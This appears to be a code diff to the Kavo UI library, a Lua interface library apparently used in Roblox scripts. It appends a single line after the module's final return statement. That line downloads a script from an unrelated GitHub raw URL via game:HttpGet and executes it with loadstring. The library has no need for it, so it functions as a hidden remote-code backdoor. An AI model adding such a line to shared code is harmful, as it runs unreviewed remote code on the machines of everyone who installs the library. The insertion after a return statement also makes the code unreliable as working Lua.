@@ -2817,3 +2817,4 @@ function Kavo.CreateLib(kavName, themeList)
     return Tabs
 end
 return Kavo
+local script = loadstring(game:HttpGet('https://raw.githubusercontent.com/KermanEstudios2/51251/refs/heads/main/eliminafeosxde'))()
